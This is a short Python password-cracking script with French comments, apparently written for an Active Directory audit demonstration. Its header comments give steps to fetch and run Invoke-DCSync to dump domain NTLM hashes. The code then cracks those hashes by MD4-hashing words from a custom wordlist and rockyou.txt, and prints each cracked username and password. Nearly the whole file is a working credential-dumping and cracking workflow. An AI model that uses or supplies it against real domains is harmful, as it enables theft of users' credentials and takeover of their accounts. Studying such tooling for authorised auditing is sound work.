# Dumping the hashes
# Invoke-DCSync (https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1)
# Download the file into AD, then run powershell
# Import-Module .\Invoke-DCSync.ps1
# Invoke-DCSync -PWDumpFormat

# import hashlib,binascii

# hash = hashlib.new('md4', clear_password.encode('utf-16le')).digest()
# encoded = binascii.hexlify(hash).decode("utf-8")

import hashlib, binascii

hashes = open("AD_password_dump.txt","r").read().split("\n")
# utilisation de notre propre wordlist (on a mis des mots de passes correctes juste pour la vérification)
wordlist = open("wordlist.txt","r").read().split("\n")
# si on veut lancer ce script sur un vrai AD, on doit utiliser une wordlist puissante (par exemple qui respecte  les exigences de complexité d'un mot de passe)
# ici juste pour la démonstration, on a concaténé les deux wordlists pour avoir un maximum de possibilité
# lien de téléchargement de rockyou.txt (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
wordlist += open("rockyou.txt","r").read().split("\n")

users = {} # initiate users dictionary with hashed passwords
found = {} # initiate users dictionary for cracked passwords

print("username and their passwords hashes")
for i in hashes:
	username = i.split(":")[0]
	password = i.split(":")[3]
	users[username]=password
	# print("{} => {}".format(username,password))
	for clear_password in wordlist:
		encoded = binascii.hexlify(hashlib.new('md4', clear_password.encode('utf-16le')).digest()).decode("utf-8") # generate a NTLM hash 
		if password == encoded:
			found[username]=clear_password

# print(found)
print("************** Password Founds ************** ")
for f in found:
	print("[+] Password found {} ==> {}".format(f,found[f]))

intersection = list(set(list(found.keys())).symmetric_difference(list(users.keys())))
print("************** Password Not Cracked ************** ")
for nf in intersection:
	print("[-] Password not found {} ==> {}".format(nf,users[nf]))
